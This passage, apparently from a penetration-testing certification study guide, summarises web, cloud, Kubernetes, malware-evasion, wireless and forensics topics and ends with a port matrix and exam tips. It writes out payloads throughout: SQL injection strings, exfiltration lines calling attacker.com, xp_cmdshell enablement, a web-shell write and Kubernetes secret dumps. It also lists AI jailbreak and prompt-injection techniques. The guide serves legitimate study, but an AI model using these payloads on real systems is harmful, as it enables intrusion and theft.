  * Error-Based: Forces database error messages leaking versions/data (MSSQL: `' AND 1=CONVERT(int, @@version)--`; MySQL: `' AND extractvalue(1, version())--`).
  * Blind Boolean-Based: Infers characters by testing TRUE (`AND 1=1`) vs. FALSE (`AND 1=2`) application responses.
  * Blind Time-Based: Injects delay functions (MySQL: `' AND SLEEP(5)--`; MSSQL: `'; WAITFOR DELAY '0:0:5'--`; PostgreSQL: `'; SELECT pg_sleep(5)--`).
  * Out-of-Band (OOB): Triggers DNS/HTTP requests from the database server (MySQL: `SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\test'))`; Oracle: `UTL_HTTP.REQUEST('http://attacker.com/'||user)`).
  * Second-Order SQLi: Input stored safely initially; executes maliciously when retrieved and concatenated into a secondary SQL query.
* **SQL Server `xp_cmdshell` Abuse:**
  * Extended stored procedure executing OS commands under MSSQL service context: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami';`.
* **MySQL File Read/Write Conditions:**
  * `LOAD_FILE('/etc/passwd')` and `SELECT 'payload' INTO OUTFILE '/var/www/html/shell.php'`.
  * Requirements: User must have the FILE privilege, and `secure_file_priv` must be empty (`""`) or disabled (`NULL`).
* **sqlmap Advanced Syntax & Evasion:**
  * `--dbs` (enumerate databases), `--tables`, `--columns`, `--dump`, `--os-shell`.
  * `--technique=T` (time-based), `--technique=U` (union), `--technique=B` (boolean).
  * `--tamper=space2comment,randomcase,charencode` (WAF bypass scripts).
  * Custom JSON injection: `sqlmap -r request.txt -p parameter` or marking injection point with asterisk (`{"id":"1*"}`).
* **Cross-Site Scripting (XSS) Types:**
  * Reflected XSS: Non-persistent payload reflected off server responses; requires victim to click a crafted link.
  * Stored (Persistent) XSS: Payload saved directly into application database; executes automatically for every visiting user.
  * DOM-Based XSS: Vulnerability entirely client-side; JavaScript reads untrusted data from a source (`location.search`, `location.hash`, `document.referrer`) and writes it to a dangerous execution sink (`innerHTML`, `eval()`, `document.write()`).
  * HTML Comment Breakout: Payload `--><script>alert(1)</script><!--` injected into reflected comments.
* **Cross-Site Request Forgery (CSRF / Session Riding):**
  * Forces an authenticated user's browser to execute unauthorized state-changing requests using ambient cookies.
  * Mitigation: Anti-CSRF Synchronizer Tokens, `SameSite=Strict` cookies, and re-authentication for sensitive actions.
* **Session Management & Token Storage Security:**
  * `localStorage` Risk: Permanently vulnerable to token theft via any XSS payload (`localStorage.getItem('token')`).
  * Secure Cookie Baseline: `Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict`.
  * Session Fixation: Attacker supplies a pre-set session ID; defeated by calling `session_regenerate_id(true)` immediately after successful authentication.
  * Token Binding (RFC 8471): Cryptographically binds session tokens to the underlying TLS connection.
  * Session Sidejacking: Sniffing session cookies over unencrypted HTTP (tools: `Ferret` + `Hamster`).
* **GraphQL Security & Reconnaissance:**
  * Introspection: Querying `{ __schema { types { name } } }` extracts the full schema, queries, mutations, and field resolvers.
  * Vulnerabilities: Deeply nested recursive queries causing DoS, query batching to bypass rate limiting, and broken authorization on field resolvers. Tool: `Clairvoyance` (schema recovery when introspection is disabled).
* **JWT (JSON Web Token) Attack Vectors:**
  * `alg: none` Bypass: Header set to `{"alg": "none"}` with signature removed.
  * Algorithm Confusion (RS256 -> HS256): Switching asymmetric RS256 to symmetric HS256 and signing the token using the server's public RSA key as the HMAC secret.
  * Weak Secrets: Brute-forcing weak HMAC secrets using `hashcat -m 16500` or `jwt_tool`.
  * Missing Expiration: Tokens lacking an `exp` claim remain valid indefinitely.
* **OWASP API Security Top 10 Specifics:**
  * BOLA (Broken Object Level Authorization / IDOR - API1): Manipulating resource IDs (e.g., `/api/orders/1001` to `/api/orders/1002`) to access another user's data.
  * BFLA (Broken Function Level Authorization - API5): Invoking administrative endpoints (e.g., `DELETE /api/admin/users/1`) using standard user privileges.
  * Mass Assignment: Ingestion of unvalidated client JSON parameters directly into backend database models (e.g., submitting `{"admin": true}`).
* **Server-Side Template Injection (SSTI):**
  * Evaluates untrusted user input within server template engines (Jinja2, Twig, FreeMarker). Confirmed via math evaluation (`{{7*7}}` -> `49`) leading to RCE via reflection.
* **Prototype Pollution (Client & Server-Side):**
  * Modifying `Object.prototype` via `__proto__` in JavaScript/Node.js. Pollutes global object properties to bypass authorization logic or achieve RCE when spawning child processes.
* **DOM Clobbering:**
  * Injecting HTML elements with `id` or `name` attributes (e.g., `<a id="config" href="evil.com">`) to overwrite global JavaScript variables used by client scripts.
* **CSS Injection:**
  * Abusing CSS attribute selectors (`input[value^='a'] { background: url('//attacker.com/a'); }`) to exfiltrate anti-CSRF tokens character-by-character without JavaScript execution.
* **XML Billion Laughs (XML Entity Bomb):**
  * XML DoS attack where nested entity definitions expand exponentially (`&lol9;` -> $10^9$ strings), crashing parsers via memory exhaustion. Defended with `FEATURE_SECURE_PROCESSING`.
* **HTTP Parameter Pollution (HPP):**
  * Submitting duplicate query parameters (`?id=1&id=2`) to exploit discrepancies in parsing order between front-end WAFs and back-end application servers.
* **HTTP Request Smuggling:**
  * Desynchronizing front-end proxies and back-end web servers by sending ambiguous `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers (CL.TE, TE.CL, TE.TE), allowing request queue poisoning and credential theft.
* **HTTP/2 Rapid Reset (CVE-2023-44487):**
  * Record-breaking DDoS technique sending streams and immediately cancelling them with `RST_STREAM` frames, overwhelming server CPU state.
* **Cross-Site WebSocket Hijacking (CSWSH):**
  * Exploiting WebSockets' lack of Same-Origin Policy enforcement to establish unauthorized, authenticated WebSocket connections from malicious third-party origins.
* **Cross-Origin Resource Policy (CORP):**
  * Header (`Cross-Origin-Resource-Policy: same-origin`) preventing cross-origin resource embedding, mitigating Spectre-based side-channel memory leaks.
* **SSRF URI Scheme Abuse:**
  * Using alternative URL schemes (`file:///etc/passwd`, `gopher://127.0.0.1:6379/...`, `dict://`) in SSRF payloads to read local files or send raw TCP commands to internal services.
* **Subdomain Takeover:**
  * Re-registering third-party cloud resources (GitHub Pages, AWS S3, Heroku) left pointed to by dangling DNS `CNAME` records.
* **Soft 404 Handling:**
  * Servers returning HTTP 200 OK for nonexistent pages. Handled using `--wildcard` in Gobuster or response size filtering (`-fs <size>`) in FFUF.
* **Security Headers Checklist:**
  * `X-Content-Type-Options: nosniff` (mitigates MIME-type sniffing).
  * `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'` (mitigates Clickjacking).
  * `Strict-Transport-Security` (HSTS - enforces HTTPS; preload list).
  * `Cross-Origin-Resource-Policy: same-origin`.
  * Suppression of `X-Powered-By` and `Server:` banners.
* **Spring Boot Actuator Exposure:**
  * Unsecured `/actuator/env` exposes system environment variables and secrets; `/actuator/heapdump` leaks raw JVM memory dumps.
* **SAML XML Signature Wrapping (XSW):**
  * Modifying SAML assertions so that the signature validates the unaltered XML block while the application consumes the malicious payload.
* **File Upload Restrictions & Bypass:**
  * Bypass extension checks via MIME manipulation in multipart POST body (changing `Content-Type: application/x-php` to `image/jpeg`) or double extensions (`shell.php.jpg`).
  * Mitigation: Validate magic bytes (file signature), store uploads outside web root, remove execute permissions (`php_flag engine off`).
* **Apache Path Traversal CVEs:**
  * CVE-2021-41773 / CVE-2021-42013: Path traversal in Apache 2.4.49/2.4.50 via URL-encoded dot sequences (`/.%2e/`), escalating to RCE when `mod_cgi` is enabled.
* **PHP phpinfo() Disclosure:**
  * Exposes `DOCUMENT_ROOT`, loaded extensions, environment variables (`$_ENV`), and `disabled_functions`.

  ---

  ## Domain 7: Cloud Infrastructure, Kubernetes & Serverless Security

* **Cloud Security Architecture & Posture Management:**
  * CNAPP: Integrated cloud-native application protection platform combining CSPM, CWPP, and CIEM.
  * CSPM (Cloud Security Posture Management): Automated detection of cloud storage misconfigurations, compliance drift, and exposed APIs.
  * CWPP (Cloud Workload Protection Platform): Runtime container, VM, and serverless defense monitoring process drift and rogue sockets.
  * CIEM (Cloud Infrastructure Entitlement Management): Audits and eliminates excessive IAM permissions across multi-cloud environments.
* **AWS IMDS & Serverless Credential Endpoints:**
  * EC2 Metadata (IMDSv1): `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role]`. (IMDSv2 requires PUT token).
  * Lambda / ECS Container Credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.
* **AWS S3 Bucket Misconfigurations:**
  * Public Read: `Principal: *` + `Action: s3:GetObject`.
  * Public Write: `Action: s3:PutObject` (allows malware staging, defacement, and dependency poisoning).
* **AWS GuardDuty Data Sources:**
  * Ingests AWS CloudTrail Event Logs, VPC Flow Logs, and DNS Query Logs; uses ML to detect cryptomining, compromised instances, and unauthorized API calls.
* **Kubernetes API Server Misconfigurations:**
  * Exposing port 6443 with `--anonymous-auth=true` and binding `system:anonymous` to `cluster-admin`.
  * Kubernetes Dashboard exposed with `--enable-skip-login`.
* **Kubernetes etcd Compromise (Port 2379):**
  * Unauthenticated etcd access allows dumping all cluster secrets (`etcdctl get /registry/secrets/...`), extracting bootstrap tokens, modifying RBAC policies directly (`etcdctl put /registry/clusterrolebindings/...`), and dumping snapshots (`etcdctl snapshot save`).
* **Kubernetes RBAC Privilege Escalation:**
  * Pods mounting service account tokens bound to `cluster-admin`: `kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets -A -o yaml`.
  * Mitigated by setting `automountServiceAccountToken: false`.
* **Kubernetes Pod Security Admission (PSA):**
  * Modes: `enforce` (blocks pod creation), `audit` (logs event), `warn` (emits client warning but permits pod start).
  * Production namespaces in `warn` mode provide zero enforcement against privileged pods.
* **Istio Service Mesh mTLS Modes:**
  * PERMISSIVE Mode: Accepts both mTLS and plaintext HTTP traffic, allowing an attacker pod to bypass sidecar mutual authentication and reach services in plaintext.
  * STRICT Mode: Enforces cryptographic mTLS verification for all inter-pod traffic.
* **Container Escape Vectors:**
  * Running containers with `--privileged` or `CAP_SYS_ADMIN` allows mounting host storage (`fdisk -l` -> `mount /dev/sda1 /mnt`).
  * Mounting `/var/run/docker.sock` allows spawning sibling containers mounting host root.
  * CVE-2019-5736: Container escape overwriting the host runc binary via `/proc/self/exe` file descriptor race without requiring privileged mode.
* **Container Supply Chain & Typosquatting:**
  * Typosquatted images (e.g., `python:3.11-s1im`). Defended with image digest pinning (`python@sha256:...`) and Sigstore/Cosign admission signature validation.
* **Runtime Container Monitoring (Falco & eBPF):**
  * Uses eBPF / kernel modules to monitor system calls (`execve`, `setns`). Rules: `Launch Privileged Container`, `Execution from /proc filesystem`.
* **AI / Machine Learning Adversarial Attacks (MITRE ATLAS):**
  * Trojan / Backdoor Attacks (AML.T0018): Injecting triggers (e.g., MCC '9999') into less than 1% of training data. Detection: Neural Cleanse and STRIP (measuring prediction entropy under input perturbation).
  * Model Extraction / Stealing (AML.T0044): Querying prediction APIs (`/v1/models/predict`) via active learning (Knockoff Nets, ActiveThief) to train a surrogate model for white-box attacks.
  * Adversarial Example Generation (AML.T0043): FGSM (single-step gradient sign) vs. PGD (Projected Gradient Descent - iterative multi-step bounded projection; gold standard benchmark).
  * Model Inversion Attacks (AML.T0024): Iteratively querying confidence scores to reconstruct high-dimensional training samples (e.g., facial images), violating GDPR Article 9 and BIPA. Defended via DP-SGD (Differential Privacy).
  * Model Poisoning (AML.T0020): Label-flipping poisoning injected via third-party training data feeds.
  * AI-Driven Malware Mutation: GAN-Generated Malware (MalGAN learning benign PE distributions) and Metamorphic Malware with RL/Surrogate Feedback.
* **OWASP LLM Top 10 Specifics:**
  * LLM01 (Prompt Injection): Direct (user prompt overrides) vs. Indirect (adversarial instructions embedded in external web pages, emails, or Confluence pages triggering Tool Call Hijacking).
  * LLM06 (Sensitive Information Disclosure): System prompt leaking and memorized training data extraction via multi-turn token smuggling.
  * LLM08 (Excessive Agency): Autonomous agents executing irreversible actions. Defended with Human-in-the-Loop (HITL) approval gates.
  * LLM09 (Misinformation): Model hallucinations producing false intelligence or invalid code.
  * Jailbreaking Taxonomy: Role-Play Persona (DAN prompt), Token Manipulation (Base64, leetspeak, GCG adversarial suffixes), and Many-Shot Jailbreaking (distributing context across dozens of turns).

---

## Domain 8: Malware Threats, Defense Evasion & IoT/OT Systems

* **Process Injection Techniques:**
  * Process Hollowing (RunPE): Spawns a legitimate process in suspended state (`CreateProcess`), unmaps its memory (`ZwUnmapViewOfSection`), allocates memory (`VirtualAllocEx`), writes payload (`WriteProcessMemory`), and resumes thread (`CreateRemoteThread`). (Forensic indicator: anomalous base address, RWX memory pages flagged by Volatility `malfind`).
  * Process Doppelgänging: Abuses Windows NTFS Transactions (TxF) to create a process from an uncommitted transacted file, rolling back the transaction so on-disk files match legitimate signatures.
  * DLL Injection: Standard injection using `VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread` loading a path via `LoadLibraryA`.
* **Direct Syscalls (SysWhispers / HellsGate):**
  * Resolves System Service Numbers (SSNs) directly from disk copies of `ntdll.dll` to execute kernel system calls via assembly (`syscall`), bypassing userland EDR API hooks.
* **BYOVD (Bring Your Own Vulnerable Driver):**
  * Loading legitimate, signed third-party kernel drivers with known vulnerabilities (e.g., RTCore64.sys, LOLDrivers catalog) to execute Ring 0 code and disable EDR sensors. Defended with Hypervisor-Protected Code Integrity (HVCI).
* **Sandbox Evasion Mechanisms:**
  * Environmental checks: CPU core count (less than 2), RAM (less than 4GB), disk size (less than 100GB), hypervisor CPUID strings, process enumeration, mouse cursor movement, and timing delays (`RDTSC`, `NtDelayExecution`). Defended via hypervisor introspection (DRAKVUF) and bare-metal detonation.
* **Living off the Land (LOLBAS & LotC):**
  * LOLBAS: Using signed OS utilities (`certutil -urlcache -split -f`, `bitsadmin`, `mshta.exe`, `regsvr32.exe`) for malicious payload delivery.
  * LotC (Living off the Cloud): Using legitimate SaaS APIs (OneDrive, Slack webhooks, GitHub repos) as C2 channels.
* **AMSI Bypass (Antimalware Scan Interface):**
  * Patching `AmsiScanBuffer` in `amsi.dll` in memory to return `AMSI_RESULT_CLEAN` (0), allowing malicious PowerShell scripts to execute undetected.
* **Wireless Exploitation (Aircrack Suite & Standards):**
  * `airodump-ng`: Passive packet capture isolating EAPOL frames (`eapol` filter).
  * `aireplay-ng -0`: Active frame injection sending Reason Code 7 deauthentication management frames.
  * `aircrack-ng -w wordlist.txt capture.cap`: Offline password cracking of captured 4-way handshakes.
  * WPS PIN Attack (Reaver / Bully): Exploits independent verification of 8-digit PIN halves (reduces keyspace from 10^8 to 10,000 + 1,000 = 11,000 attempts).
  * Pixie Dust Attack (`pixiewps` / `wifite --wps-pixie`): Exploits weak PRNG nonces (`E-S1`, `E-S2`) in specific AP chipsets to recover the WPS PIN in a single session.
  * KRACK (CVE-2017-13077): Forces cryptographic nonce reuse in the WPA2 4-way handshake.
  * WPA3 Improvements: Simultaneous Authentication of Equals (SAE), 192-bit Suite B mode, mandatory 802.11w Management Frame Protection (MFP).
  * WPA2-Enterprise Evil Twin: Deploying `hostapd-wpe` with a rogue RADIUS server presenting a self-signed certificate to harvest MSCHAPv2 challenge-response hashes, cracked offline via `asleap` or `hashcat -m 5500`.
* **Mobile Security (Android & iOS):**
  * MobSF: Automated static and dynamic security analysis of APK and IPA files.
  * Frida: Dynamic binary instrumentation toolkit used to hook functions in memory (bypassing SSL pinning and root detection at runtime).
  * Android ADB: Port 5555; if left enabled, allows unauthenticated shell execution (`adb shell`) and data extraction via `adb backup` parsed with Android Backup Extractor (ABE).
  * iOS Attacks: Malicious `.mobileconfig` profiles installing rogue root CAs; zero-click iMessage exploits (FORCEDENTRY / CVE-2021-30860).
* **IoT & Industrial Control Systems (OT/SCADA):**
  * Modbus TCP (Port 502): Field bus protocol lacking authentication; allows reading registers (Function Code 03) and writing setpoints (Function Code 06).
  * Siemens S7comm (Port 102): ISO-TSAP protocol. Metasploit module `auxiliary/scanner/scada/s7_enumerate` queries System Status Lists (SZL) to extract CPU models and firmware versions passively.
  * Printer Exploitation (Port 9100 / JetDirect): Printer Job Language (PJL) commands (`@PJL FSUPLOAD`, `@PJL RDYMSG`) and PostScript file I/O operators for arbitrary file read and credential harvesting (Tool: PRET).
  * SS7 (Signaling System No. 7): Core telecom protocol lacking authentication; enables global location tracking, SMS interception, and 2FA bypass.
  * IMSI Catchers (Stingrays): Rogue cellular base stations broadcasting high power to force mobile devices to downgrade connections, harvesting IMSI identifiers and intercepting communications.
  * Smart Contract Reentrancy: Flaw where an external contract recursively calls back into a withdrawal function before balances update (The DAO Hack).

---

## Domain 9: Cryptography, Digital Forensics & Standards

* **Order of Volatility (RFC 3227):** CPU Registers and Caches -> RAM (Memory) -> Network State -> Running Processes -> Disk -> Backups.
* **Memory Forensics (Volatility 3 Framework):**
  * `windows.pslist.PsList` / `windows.pstree.PsTree`: Enumerate process trees.
  * `windows.netscan.NetScan`: List active and closed TCP/UDP connections.
  * `windows.malfind.Malfind`: Identify injected code in memory pages marked with `PAGE_EXECUTE_READWRITE` (RWX).
  * `windows.procdump.ProcDump`: Dump process memory to disk.
* **Windows Forensic & Execution Artifacts:**
  * Prefetch (`C:\Windows\Prefetch\*.pf`): Records last 8 execution timestamps, run count, and loaded DLLs.
  * Shimcache / AppCompatCache: Stored in `SYSTEM` registry hive; tracks execution metadata.
  * Amcache (`Amcache.hve`): Records execution paths, SHA-1 file hashes, and install dates.
  * UserAssist: ROT-13 encoded registry keys in `NTUSER.DAT` tracking GUI application execution.
  * Master File Table ($MFT): Discrepancies between `$STANDARD_INFORMATION` (user-space / timestomped) and `$FILE_NAME` (kernel-space) expose timestomping.
  * PSReadLine History: Text log of executed PowerShell commands at `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
* **High-Yield Windows Security Event IDs:**
  * 4624: Successful Logon (Logon Type 2: Interactive, Type 3: Network, Type 10: RDP).
  * 4625: Failed Logon (brute force indicator).
  * 4720: User Account Created.
  * 4728 / 4732: Member Added to Privileged Security Group.
  * 4768: Kerberos TGT Requested (AS-REQ).
  * 4769: Kerberos Service Ticket Requested (TGS-REQ / Kerberoasting).
  * 4771: Kerberos Pre-Authentication Failed (Kerbrute indicator).
  * 4776: NTLM Credential Validation.
  * 4662: Operation Performed on Object (DCSync indicator).
  * 4104: PowerShell Script Block Logging (captures deobfuscated code).
  * 4103: PowerShell Module Logging.
  * 7045: Service Installed in System (Persistence indicator).
  * 1102: Security Audit Log Cleared (Tampering indicator).
  * 104: System Log Cleared.
* **Cryptographic Key Equivalence (NIST):** 128-bit Symmetric (AES) is roughly equal to 3072-bit Asymmetric (RSA/DH) and 256-bit Elliptic Curve (ECC).
* **Padding Oracle & Cryptographic Attacks:**
  * Padding Oracle (POODLE / CVE-2014-3566): Exploits CBC-mode PKCS#7 error message variations to decrypt ciphertext byte-by-byte. Defended with Authenticated Encryption (AES-GCM, ChaCha20-Poly1305).
  * BEAST (CVE-2011-3389): Chosen-plaintext attack against TLS 1.0 CBC mode exploiting predictable initialization vectors.
  * Length Extension Attack: Affects Merkle-Damgård hash functions (MD5, SHA-1, SHA-256); allows appending data without knowing the secret key. Defended using HMAC.
  * Quantum Threats: Shor's algorithm breaks asymmetric cryptography (RSA, ECC, Diffie-Hellman) in polynomial time; Grover's algorithm halves symmetric AES keyspace (AES-256 remains secure with 128-bit security). Post-Quantum Cryptography (PQC) standards: CRYSTALS-Kyber (ML-KEM) and CRYSTALS-Dilithium (ML-DSA).
  * Password Storage: Always use memory-hard adaptive hashing (Argon2id, bcrypt, scrypt) with unique per-user random salts. Never encrypt passwords.
  * Key Escrow & HSM Quorum: Secure key management enforces M-of-N split-knowledge multi-party authentication (Shamir's Secret Sharing) to prevent single-operator signing abuse.
* **Digital Forensics & Deepfake Analysis:**
  * rPPG (Remote Photoplethysmography): Detects biological blood-flow micro-pulsations in facial pixels; absent in synthetic deepfakes.
  * FFT / DCT Analysis: Exposes periodic grid checkerboard artifacts introduced by neural upsampling in GAN/diffusion pipelines.
  * Stylometric Authorship Attribution: Burrows' Delta analysis (function word z-scores), JGAAP, and Binoculars (log-probability curvature) distinguish AI-generated writing style mimicry from human baseline text.
* **Standards, Methodologies & Engagement Documentation:**
  * Pre-Engagement Authorization: Requires signed Statement of Work (SoW), Rules of Engagement (RoE), and formal written Authorization Letter from a C-level executive before any testing begins.
  * NIST SP 800-115: Technical Guide to Information Security Testing and Assessment.
  * MITRE D3FEND: Defensive countermeasure matrix mapped directly to ATT&CK offensive techniques.
  * ISO/IEC 27001: Information Security Management System (ISMS) standard based on the Plan-Do-Check-Act (PDCA) cycle.
  * PCI DSS v4.0: Mandates quarterly external ASV vulnerability scans and annual penetration testing for cardholder data environments.

---

# 3. Quick-Reference Hook & Port Matrix

| Protocol / Service | Default Port(s) | Key Technical Vulnerability / Command Hook | High-Yield Tool |
| :--- | :---: | :--- | :--- |
| **FTP** | 21/TCP | Cleartext credentials (`USER`/`PASS`), anonymous login | Wireshark (`ftp.request.command`) |
| **SSH** | 22/TCP | Version CVEs (RegreSSHion CVE-2024-6387, OpenSSH 7.4 timing) | Nmap (`-sV`), Netcat |
| **Telnet** | 23/TCP | Cleartext unencrypted terminal | Wireshark (`tcp.port == 23`) |
| **SMTP** | 25/TCP | User enumeration via `VRFY`, `EXPN`, `RCPT TO` | `smtp-user-enum` |
| **DNS** | 53/TCP/UDP | Zone Transfer (AXFR), Cache Poisoning (Kaminsky), Tunneling | `dig axfr`, `iodine`, `dnscat2` |
| **Kerberos** | 88/TCP/UDP | Kerberoasting, AS-REP Roasting, Pre-Auth Brute Force | `kerbrute`, `Rubeus`, `hashcat` |
| **HTTP / HTTPS** | 80 / 443 | Web injections (SQLi, XSS, SSRF, SSTI, Request Smuggling) | `Burp Suite`, `sqlmap`, `FFUF` |
| **Modbus TCP** | 502/TCP | Unauthenticated industrial register read/write (FC03/FC06) | Nmap (`modbus-discover`), Shodan |
| **NetBIOS** | 137-139 | Name queries (`<1E>` election, `<20>` server), LLMNR fallback | `nbtstat -A`, `Responder` |
| **SMB over IP** | 445/TCP | EternalBlue (MS17-010), Null sessions, NTLM Relay | `enum4linux`, `psexec.py`, `macof` |
| **LDAP / LDAPS** | 389 / 636 | Anonymous directory bind, schema dumping, unindexed queries | `ldapsearch`, `ADExplorer` |
| **NFS** | 2049/TCP/UDP | Unauthenticated export mounting, `no_root_squash` privesc | `showmount -e` |
| **Redis** | 6379/TCP | Unauthenticated RCE via `CONFIG SET dir /root/.ssh/` | `redis-cli` |
| **WinRM** | 5985 / 5986 | Cleartext HTTP NTLM (5985) vs. HTTPS encrypted (5986) | `Evil-WinRM`, `CrackMapExec` |
| **Metasploit C2** | 4444/TCP | Default Meterpreter reverse TCP listener port | Metasploit (`multi/handler`) |
| **Kubernetes API** | 6443/TCP | `--anonymous-auth=true` bound to `cluster-admin` | `kubectl`, `kube-hunter` |
| **etcd (K8s)** | 2379/TCP | Unauthenticated cluster secrets and token exfiltration | `etcdctl` |
| **Printer AppSocket** | 9100/TCP | PJL file upload (`@PJL FSUPLOAD`), PostScript arbitrary read | `PRET`, Netcat |

---

# 4. Final Review Roadmap for Exam Day

* **Step 1: Rapid 5-Minute Scan:** Review Section 3 (Quick-Reference Hook & Port Matrix).
* **Step 2: Mental Mapping (10 Minutes):** Read Section 1 (Multi-Stage Correlated Attack Chains).
* **Step 3: Deep Domain Review (20 Minutes):** Focus on Active Directory, Cloud/K8s, AI Security, and Digital Forensics triggers.
* **Trigger-First Answering:** Scan the scenario stem for technical anchors (Event ID, Port, Protocol, Binary Name, CVE) before evaluating options.
* **Eliminate Out-of-Layer Distractors:** Instantly eliminate choices belonging to unrelated OSI layers or operational domains.
* **Attack Chaining Perspective:** When answering multi-step questions, locate the attack phase (Recon -> Initial Access -> Local Escalation -> AD/Lateral Pivot -> Exfiltration).